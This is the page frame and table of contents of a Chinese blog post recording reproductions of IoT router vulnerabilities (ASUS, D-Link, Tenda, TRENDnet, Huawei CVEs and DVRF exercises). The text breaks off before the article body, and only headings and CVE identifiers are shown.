<!DOCTYPE html>
<html class="scroll-smooth" data-auto-appearance="false" data-default-appearance="dark" dir="ltr" lang="CN"><head>
<script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f260c483ac9fab4fdd9fd55057878c8c";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
<meta charset="utf-8"/>
<meta content="zh-cn" http-equiv="content-language"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
<title>IoT漏洞复现记录 · ta0lve</title>
<meta content="IoT漏洞复现记录 · ta0lve" name="title"/>
<meta content="IoT, " name="keywords"/>
<link href="https://ta0lve.github.io/posts/iot/0x02/" rel="canonical"/>
<link href="/css/main.bundle.min.c6116b9ed1c907a8c0eb015f377d3eecc07e448d75729e31fc3de5881465c6c172ba9fa9a6800c030116caf2a110d92242bb816639484ca791f7cd107a8d49b5.css" integrity="sha512-xhFrntHJB6jA6wFfN30+7MB+RI11cp4x/D3liBRlxsFyup+ppoAMAwEWyvKhENkiQruBZjlITKeR980Qeo1JtQ==" rel="stylesheet" type="text/css"/>
<script integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg==" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js" type="text/javascript"></script>
<script data-copied="" data-copy="" defer="" id="script-bundle" integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ+dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5+a8AgFUkA==" src="/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js" type="text/javascript"></script>
<script src="/js/zoom.min.js"></script>
<link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
<link href="/site.webmanifest" rel="manifest"/>
<meta content="IoT漏洞复现记录" property="og:title"/>
<meta content="如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 漏洞" property="og:description"/>
<meta content="article" property="og:type"/>
<meta content="https://ta0lve.github.io/posts/iot/0x02/" property="og:url"/><meta content="https://ta0lve.github.io/posts/iot/0x02/featured.jpg" property="og:image"/><meta content="posts" property="article:section"/>
<meta content="2024-02-22T00:00:00+00:00" property="article:published_time"/>
<meta content="2024-02-23T00:00:00+00:00" property="article:modified_time"/>
<meta content="summary_large_image" name="twitter:card"/>
<meta content="https://ta0lve.github.io/posts/iot/0x02/featured.jpg" name="twitter:image"/>
<meta content="IoT漏洞复现记录" name="twitter:title"/>
<meta content="如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 漏洞" name="twitter:description"/>
<script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "IoT漏洞复现记录",
    "headline": "IoT漏洞复现记录",
    
    "abstract": "如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 漏洞",
    "inLanguage": "zh-cn",
    "url" : "https:\/\/ta0lve.github.io\/posts\/iot\/0x02\/",
    "author" : {
      "@type": "Person",
      "name": "ta0lve"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-02-22T00:00:00\u002b00:00",
    "datePublished": "2024-02-22T00:00:00\u002b00:00",
    
    "dateModified": "2024-02-23T00:00:00\u002b00:00",
    
    "keywords": ["IoT"],
    
    "mainEntityOfPage": "true",
    "wordCount": "13389"
  }]
  </script>
<meta content="ta0lve" name="author"/>
<link href="mailto:hujt25@mail2.sysu.edu.cn" rel="me"/>
<link href="https://ta0lve.github.io/" rel="me"/>
<link href="https://github.com/ta0lve" rel="me"/>
<script integrity="" src="/lib/jquery/jquery.slim.min.js"></script>
<meta name="theme-color"/>
</head>
<body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
<div class="absolute flex self-center" id="the-top">
<a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href="#main-content"><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">↓</span></a>
</div>
<div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
<div class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl" id="menu-blur"></div>
<div class="relative max-w-[64rem] ml-auto mr-auto">
<div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3" style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px">
<div class="flex flex-1 items-center justify-between">
<nav class="flex space-x-3">
<a class="text-base font-medium text-gray-500 hover:text-gray-900" href="/">ta0lve</a>
</nav>
<nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
<a class="flex items-center" href="/posts/">
<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Posts">
        Posts
    </p>
</a>
<a class="flex items-center" href="/categories/">
<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Categories">
        分类
    </p>
</a>
<a class="flex items-center" href="/tags/">
<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Tags">
        标签
    </p>
</a>
<a class="flex items-center" href="/link/">
<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="友链/links">
        友链
    </p>
</a>
<a class="flex items-center" href="/about/">
<p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About">
        About
    </p>
</a>
<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400 h-12" id="search-button" title="">
<span class="relative block icon">
<svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</button>
<div class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
<button aria-label="Dark mode switcher" id="appearance-switcher" type="button">
<div class="flex items-center justify-center h-12 dark:hidden">
<span class="relative block icon">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
</span>
</div>
<div class="items-center justify-center hidden h-12 dark:flex">
<span class="relative block icon">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
</span>
</div>
</button>
</div>
</nav>
<div class="flex md:hidden items-center space-x-5 md:ml-12">
<span></span>
<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="search-button-mobile" title="">
<span class="relative block icon">
<svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</button>
<button aria-label="Dark mode switcher" id="appearance-switcher-mobile" style="margin-right:5px" type="button">
<div class="flex items-center justify-center h-12 dark:hidden">
<span class="relative block icon">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
</span>
</div>
<div class="items-center justify-center hidden h-12 dark:flex">
<span class="relative block icon">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
</span>
</div>
</button>
</div>
</div>
<div class="-my-2 -mr-2 md:hidden">
<label class="block" for="menu-controller" id="menu-button">
<input class="hidden" id="menu-controller" type="checkbox"/>
<div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
<span class="relative block icon">
<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z" fill="currentColor"></path></svg>
</span>
</div>
<div class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50" id="menu-wrapper" style="padding-top:5px;">
<ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
<li>
<span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
<span class="relative block icon">
<svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
</span>
</span>
</li>
<li class="mt-1">
<a class="flex items-center" href="/posts/">
<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Posts">
            Posts
        </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center" href="/categories/">
<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Categories">
            分类
        </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center" href="/tags/">
<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Tags">
            标签
        </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center" href="/link/">
<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="友链/links">
            友链
        </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center" href="/about/">
<p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About">
            About
        </p>
</a>
</li>
</ul>
</div>
</label>
</div>
</div>
<script>
    (function () {
        var $mainmenu = $('.main-menu');
        var path = window.location.pathname;
        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
            $(e).children('p').addClass('active');
        });
    })();
</script>
</div>
</div>
<script>
  window.addEventListener('scroll', function (e) {
    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
    var background_blur = document.getElementById('menu-blur');
    background_blur.style.opacity = (scroll / 300);
  });
</script>
<div class="relative flex flex-col grow">
<main class="grow" id="main-content">
<article>
<div class="h-[150px] md:h-[200px]" id="hero"></div>
<div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom" style="background-image:url(/posts/iot/0x02/featured.jpg);">
<div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
</div>
<div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
</div>
</div>
<div class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl" id="background-blur"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>
<header class="mt-5 max-w-prose" id="single_header">
<ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
<li class="inline hidden">
<a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"></a><span class="px-1 text-primary-500">/</span>
</li>
<li class="inline">
<a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/">Posts</a><span class="px-1 text-primary-500">/</span>
</li>
<li class="inline hidden">
<a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/iot/0x02/">IoT漏洞复现记录</a><span class="px-1 text-primary-500">/</span>
</li>
</ol>
<h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      IoT漏洞复现记录
    </h1>
<div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
<div class="flex flex-row flex-wrap items-center">
<time datetime="2024-02-22 00:00:00 +0000 UTC">February 22, 2024</time><span class="px-2 text-primary-500">·</span><time datetime="2024-02-23 00:00:00 +0000 UTC"></time><span class="px-2 text-primary-500">·</span><span>13389 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">27 分钟</span>
</div>
<div class="flex flex-row flex-wrap items-center">
<span class="mr-2" onclick="window.open(&quot;/categories/iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    IoT学习记录
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/iot/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    IoT
  </span>
</span>
</span>
</div>
</div>
<div class="flex">
<div class="place-self-center">
<div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      作者
    </div>
<div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      ta0lve
    </div>
<div class="text-sm text-neutral-700 dark:text-neutral-400">一些记录，一点思考</div>
<div class="text-2xl sm:text-lg">
<div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
<a aria-label="Email" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="mailto:hujt25@mail2.sysu.edu.cn" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom">
<span class="relative block icon">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z" fill="currentColor"></path></svg>
</span>
</span></a>
<a aria-label="Blogger" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://ta0lve.github.io/" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom">
<span class="relative block icon">
<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M446.6 222.7c-1.8-8-6.8-15.4-12.5-18.5-1.8-1-13-2.2-25-2.7-20.1-.9-22.3-1.3-28.7-5-10.1-5.9-12.8-12.3-12.9-29.5-.1-33-13.8-63.7-40.9-91.3-19.3-19.7-40.9-33-65.5-40.5-5.9-1.8-19.1-2.4-63.3-2.9-69.4-.8-84.8.6-108.4 10C45.9 59.5 14.7 96.1 3.3 142.9 1.2 151.7.7 165.8.2 246.8c-.6 101.5.1 116.4 6.4 136.5 15.6 49.6 59.9 86.3 104.4 94.3 14.8 2.7 197.3 3.3 216 .8 32.5-4.4 58-17.5 81.9-41.9 17.3-17.7 28.1-36.8 35.2-62.1 4.9-17.6 4.5-142.8 2.5-151.7zm-322.1-63.6c7.8-7.9 10-8.2 58.8-8.2 43.9 0 45.4.1 51.8 3.4 9.3 4.7 13.4 11.3 13.4 21.9 0 9.5-3.8 16.2-12.3 21.6-4.6 2.9-7.3 3.1-50.3 3.3-26.5.2-47.7-.4-50.8-1.2-16.6-4.7-22.8-28.5-10.6-40.8zm191.8 199.8l-14.9 2.4-77.5.9c-68.1.8-87.3-.4-90.9-2-7.1-3.1-13.8-11.7-14.9-19.4-1.1-7.3 2.6-17.3 8.2-22.4 7.1-6.4 10.2-6.6 97.3-6.7 89.6-.1 89.1-.1 97.6 7.8 12.1 11.3 9.5 31.2-4.9 39.4z" fill="currentColor"></path></svg>
</span>
</span></a>
<a aria-label="Github" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://github.com/ta0lve" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom">
<span class="relative block icon">
<svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z" fill="currentColor"></path></svg>
</span>
</span></a>
</div>
</div>
</div>
</div>
<div class="mb-5"></div>
</header>
<section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
<div class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
<div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block" open="">
<summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
</summary>
<div class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<nav id="TableOfContents">
<ul>
<li><a href="#asus华硕">ASUS(华硕)</a>
<ul>
<li><a href="#cve-2021-32030">CVE-2021-32030</a>
<ul>
<li><a href="#漏洞基本信息">漏洞基本信息</a></li>
<li><a href="#解包">解包</a></li>
<li><a href="#漏洞分析">漏洞分析</a></li>
<li><a href="#漏洞复现">漏洞复现</a></li>
</ul>
</li>
<li><a href="#cve-2021-20090">CVE-2021-20090</a>
<ul>
<li><a href="#漏洞基本信息-1">漏洞基本信息</a></li>
<li><a href="#解包-1">解包</a></li>
<li><a href="#漏洞分析-1">漏洞分析</a></li>
<li><a href="#漏洞复现-1">漏洞复现</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#d-link友讯">D-Link(友讯)</a>
<ul>
<li><a href="#cve-2017-12943">CVE-2017-12943</a>
<ul>
<li><a href="#漏洞基本信息-2">漏洞基本信息</a></li>
<li><a href="#解包-2">解包</a></li>
<li><a href="#漏洞分析-2">漏洞分析</a></li>
<li><a href="#漏洞复现-2">漏洞复现</a></li>
</ul>
</li>
<li><a href="#dir320">DIR320</a></li>
<li><a href="#dir645">DIR645</a></li>
<li><a href="#cnvd-2018-01084">CNVD-2018-01084</a>
<ul>
<li><a href="#漏洞基本信息-3">漏洞基本信息</a></li>
<li><a href="#解包-3">解包</a></li>
<li><a href="#静态分析">静态分析</a></li>
<li><a href="#动态调试">动态调试</a></li>
<li><a href="#exp">exp</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dvrf项目">DVRF项目</a>
<ul>
<li><a href="#解包-4">解包</a></li>
<li><a href="#dvrf-stack_bof_01">DVRF stack_bof_01</a>
<ul>
<li><a href="#静态分析-1">静态分析</a></li>
<li><a href="#动态调试-1">动态调试</a></li>
<li><a href="#exp-1">exp</a></li>
</ul>
</li>
<li><a href="#dvrf-stack_bof_02">DVRF stack_bof_02</a>
<ul>
<li><a href="#静态分析-2">静态分析</a></li>
<li><a href="#动态调试-2">动态调试</a></li>
<li><a href="#exp-2">exp</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#tenda">Tenda</a>
<ul>
<li><a href="#cve-2018-5767">CVE-2018-5767</a>
<ul>
<li><a href="#漏洞基本信息-4">漏洞基本信息</a></li>
<li><a href="#漏洞分析-3">漏洞分析</a></li>
<li><a href="#漏洞复现-3">漏洞复现</a></li>
</ul>
</li>
<li><a href="#cve-202010987">CVE-2020–10987</a>
<ul>
<li><a href="#漏洞基本信息-5">漏洞基本信息</a></li>
<li><a href="#satc定位漏洞">SaTC定位漏洞</a></li>
<li><a href="#漏洞分析-4">漏洞分析</a></li>
</ul>
</li>
<li><a href="#cve-2023-30135">CVE-2023-30135</a>
<ul>
<li><a href="#漏洞基本信息-6">漏洞基本信息</a></li>
<li><a href="#漏洞分析-5">漏洞分析</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#trendnet">TRENDnet</a>
<ul>
<li><a href="#cve-2018-7034">CVE-2018-7034</a>
<ul>
<li><a href="#漏洞基本信息-7">漏洞基本信息</a></li>
<li><a href="#漏洞分析-6">漏洞分析</a></li>
<li><a href="#漏洞复现-4">漏洞复现</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#huawei">HUAWEI</a>
<ul>
<li><a href="#cve-2017-17215">CVE-2017-17215</a>
<ul>
<li><a href="#漏洞基本信息-8">漏洞基本信息</a></li>
<li><a href="#解包-5">解包</a></li>
<li><a href="#漏洞分析-7">漏洞分析</a></li>
<li><a href="#漏洞复现-5">漏洞复现</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</div>
</details>
<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
<summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
</summary>
<div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<nav id="TableOfContents">
<ul>
<li><a href="#asus华硕">ASUS(华硕)</a>
<ul>
<li><a href="#cve-2021-32030">CVE-2021-32030</a>
<ul>
<li><a href="#漏洞基本信息">漏洞基本信息</a></li>
<li><a href="#解包">解包</a></li>
<li><a href="#漏洞分析">漏洞分析</a></li>
<li><a href="#漏洞复现">漏洞复现</a></li>
</ul>
</li>
<li><a href="#cve-2021-20090">CVE-2021-20090</a>
<ul>
<li><a href="#漏洞基本信息-1">漏洞基本信息</a></li>
<li><a href="#解包-1">解包</a></li>
<li><a href="#漏洞分析-1">漏洞分析</a></li>
<li><a href="#漏洞复现-1">漏洞复现</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#d-link友讯">D-Link(友讯)</a>
<ul>
<li><a href="#cve-2017-12943">CVE-2017-12943</a>
<ul>
<li><a href="#漏洞基本信息-2">漏洞基本信息</a></li>
<li><a href="#解包-2">解包</a></li>
<li><a href="#漏洞分析-2">漏洞分析</a></li>
<li><a href="#漏洞复现-2">漏洞复现</a></li>
</ul>
</li>
